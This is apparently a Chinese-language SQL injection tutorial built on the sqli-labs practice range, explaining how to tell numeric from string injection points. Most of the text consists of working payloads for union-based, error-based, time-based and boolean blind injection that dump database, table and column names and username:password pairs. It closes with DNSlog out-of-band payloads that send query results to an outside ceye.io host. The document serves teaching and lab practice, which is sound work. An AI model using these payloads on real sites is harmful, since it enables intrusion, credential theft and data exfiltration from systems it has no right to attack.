基本类型

通常SQL注入漏洞分为两大基本类型

数字型注入和字符型注入。

其实所有的类型都是根据数据库本身表的类型所产生的，在我们创建表的时候会发现其后总有个数据类型的限制，而不同的数据库又有不同的数据类型，但是无论怎么分常用的查询数据类型总是以数字与字符来区分的，所以就会产生注入点为何种类型。


如何判断？

举个例子，如下

数字型判断：

当输入的参数x为整型时，通常执行的sql语句为：

select * from 表名 where id = x;

这种情况下，可以使用and 1=1和and 1=2进行判断

当输入and 1=1时候实际执行的语句为：

select * from 表名 where id = x and 1=1;

没有语法错误，and逻辑判断也正常，所以页面返回正常。

当输入and 1=2时候实际执行的语句为：

select * from 表名 where id = x and 1=2;

没有语法错误，但是and逻辑判断为假，所以页面返回错误。

如果输入的x为字符型的话，输入and 1=1和and 1=2实际执行的语句为：

select * from 表名 where id = 'x and 1=1';和select * from 表名 where id = 'x and 1=2';

查询语句将and语句全部转换成了字符串，并没有进行and逻辑判断，所以并不会出现上面的结果。


字符型判断：

当输入的参数x为字符型时，通常执行的sql语句为：

select * from 表名 where id = 'x';

这种类型我们同样可以使用 and '1'='1 和 and '1'='2来判断

Url 地址中输入 www.xxx.com/abc.php?id= x' and '1'='1

页面运行正常，继续进行下一步。

Url 地址中继续输入 www.xxx.com/abc.php?id= x' and '1'='2

页面运行错误，则说明此 sql注入为字符型注入。

原因如下：

当输入and '1'='1时候实际执行的语句为：

select * from 表名 where id = 'x' and '1' = '1';

没有语法错误，and逻辑判断也正常，所以页面返回正常。

当输入and '1'='2时候实际执行的语句为：

select * from 表名 where id = 'x' and '1' = '2';

没有语法错误，但是and逻辑判断为假，所以页面返回错误。


小技巧：可以根据页面的报错信息判断，当我们在参数后面添加单双引号时，如果报错信息中出现了参数信息，则是字符型注入，需要我们去闭合，如果报错信中没有出现参数信息则是数字型注入，不需要闭合。


提示：当判断出是字符型注入时候，我们需要将添加的单双引号注释掉，注释的方式有--+、#等。


SQL注入的几种常见手法

联合查询、报错注入、延时注入、布尔盲注

那以sqli-labs靶场第一关来讲解一下这几种基本注入手法。


联合查询

适用条件：查询的信息在前端有回显

1、当我们不断改变参数值，发现页面存在不同的回显，所以此处可采取联合查询的注入手法。

2、当我们在参数后拼接and 1=1和and 1=2时候发现，返回的页面都是相同的，所以可以判断出是字符型注入。当我们在参数后添加单引号时候，页面报错，执行的语句为：

select * from users where id='1'';

将单引号注释掉，页面正常，加双引号实际执行的语句为：

select * from users where id='1''';

所以页面正常。由此判断出该注入单引号字符型注入。

3、当我们判断出是单引号字符型注入并可以采取联合查询的手法，我们可以通过order by函数来判断表格中共存在几列内容。通过判断发现表中列数为三列。

4、接下来就直接采取联合查询手法进行数据库、表等内容的查询了

查询出数据库名'security'。

提示：information_schema数据库是5.0版本后才增加的，用来存储MySQL数据库管理系统中，所有的库名、表名、字段名等信息的数据库。

group_concat函数的作用将一列内容横着给列出来。

5、已知库名爆破表名。
从information_schema.tables中查询所有表名，并指定该表所属的数据库为security。
?id=-2' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+

得到用户的列表后，显然users是用户数据表。

6、已知表名爆破字段名。

从information_schema.columns中查询所有的字段名，并指定查询字段所属的表名为users。

?id=-2' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+

7、接下来就指定指定字段名查询用户名和密码

查询users表中字段名是username、password的内容。

?id=-2' union select 1,2,group_concat(username,0x3a,password) from users; --+

提示：0x3a：0x是十六进制标志，3a是十进制的58，是ascii中的 ':' ，用以分割pasword和username。


报错注入

适用条件：必须有错误回显

当我们在参数后添加任意符号时候，页面报错，出现报错信息，所以可采取报错注入的手法。

报错注入手法payload
and extractvalue(1,concat(0x7e,查询内容)))

1、爆库名

?id=1' and extractvalue(1,concat(0x7e,(select database()))) --+

2、已知数据库爆表名
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security'))) --+

3、已知表名爆字段名
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+

4、已知字段名爆字段内容
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) --+


延时注入

适用条件：通过and sleep（x）判断，页面回显明显有延时。

通过在参数后拼接and sleep（5）发现，页面五秒后才有回显说明可采取延时注入的手法。

延时注入payload

and if(判断部分，sleep(5)，1)

首先判断出数据库的长度

?id=1' and if(length(database())=8,sleep(5),1) --+

有了数据库长度后，开始从第一个字符判断，判断每个位置上字符是否是数据库名字所对应的，如果是则网页五秒后回显，不是则相反，以此类推。

?id=1' and if(left(database(),1)='s',sleep(5),1) --+

......

?id=1' and if(left(database(),8)='security',sleep(5),1) --+

接下来就是重复性的操作通过是否延时回显判断出表名、字段名等信息。

爆破表名

?id=1' and if( left((select table_name from information_schema.tables where table_schema='security' limit 3,1),1)='u' ,sleep(5),1)--+

......

?id=1' and if( left((select table_name from information_schema.tables where table_schema='security' limit 3,1),5)='users' ,sleep(5),1)--+


布尔盲注

适用条件：布尔盲注应用于无数据回显，且web页面无报错信息，此时不能通过报错注入的方法爆出数据，布尔盲注的web页面只有两种回显结果，正确的页面以及错误的页面，且错误的页面无报错提示语句，正确的页面不能输出数据。

拿sqli-labs第八关举例子

正确查询页面结果回显

错误查询页面结果回显不显示

所以利用布尔盲注这种正确页面有回显，错误则不回显这种特性来判断库名、表名、字段名。

布尔盲注payload

and left(判断部分，x)

首先判断数据库

?id=1' and left((select database()),1)='s' --+

......

?id=1' and left((select database()),8)='security' --+

判断表名

?id=1' and left((select table_name from information_schema.tables where table_schema='security' limit 3,1),1)='u' --+

......

?id=1' and left((select table_name from information_schema.tables where table_schema='security' limit 3,1),5)='users' --+

然后就是重复的操作已知表名判断字段名


针对布尔盲注我们还可以采取另一种方法，利用dnslog，通过dnslog，把数据外带，用dns解析记录查看。

dns注入原理：通过子查询，将内容拼接到域名内，让load_file（）去访问共享文件，访问的域名被记录此时变为显错注入，将盲注变为显错注入，读取远程共享文件，通过拼接出函数做查询，拼接到域名中，访问时将访问服务器，记录后查看日志。

payload

and load_file(concat('//',查询语句,'.dnslog地址/abc')

查询库名

?id=1' and load_file(concat('//', database(),'.9nhtfn.ceye.io/abc')) --+

查询表名
?id=1' and load_file(concat('//', (select table_name from information_schema.tables where table_schema=database() limit 4,1 ),'.9nhtfn.ceye.io/abc')) --+

查询字段名
?id=1' and load_file(concat('//',(select column_name from information_schema.columns where table_name='users' and table_schema=database() limit 0,1),'.9nhtfn.ceye.io/abc')) --+
